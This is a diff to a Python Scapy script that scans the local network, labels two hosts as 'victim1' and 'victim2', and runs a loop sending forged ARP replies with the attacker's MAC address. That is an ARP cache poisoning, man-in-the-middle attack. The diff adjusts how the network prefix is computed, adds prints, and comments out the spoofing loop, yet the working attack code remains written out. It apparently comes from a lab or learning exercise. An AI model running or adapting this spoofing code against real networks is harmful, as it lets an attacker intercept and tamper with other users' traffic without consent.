@@ -1,7 +1,10 @@
 from scapy.all import *
 from scapy.all import IP, Ether, ARP, ICMP
 
-network_addr = conf.route.net
+network_addr = get_if_addr(conf.iface).split('.')
+print(network_addr)
+network_addr = network_addr[0] + "." + network_addr[1] + "." + network_addr[2]
+print(network_addr)
 
 frame = Ether(dst="ff:ff:ff:ff:ff:ff")
 
@@ -23,9 +26,10 @@ victim2_IP = IP_on_network[2]
 victim2_MAC = MAC_on_network[2]
 
 atk_mac = get_if_hwaddr(conf.iface)
-
+'''
 while True:
     spoof_arp_victim2 = Ether(src=atk_mac)/ARP(op=2, pdst=victim2_IP, hwdst=victim2_MAC, psrc=victim1_IP)
     send_spoof2 = sendp(spoof_arp_victim2)
     spoof_arp_victim1 = Ether(src=atk_mac)/ARP(op=2, pdst=victim1_IP, hwdst=victim1_MAC, psrc=victim2_IP)
     send_spoof1 = sendp(spoof_arp_victim1)
+    '''
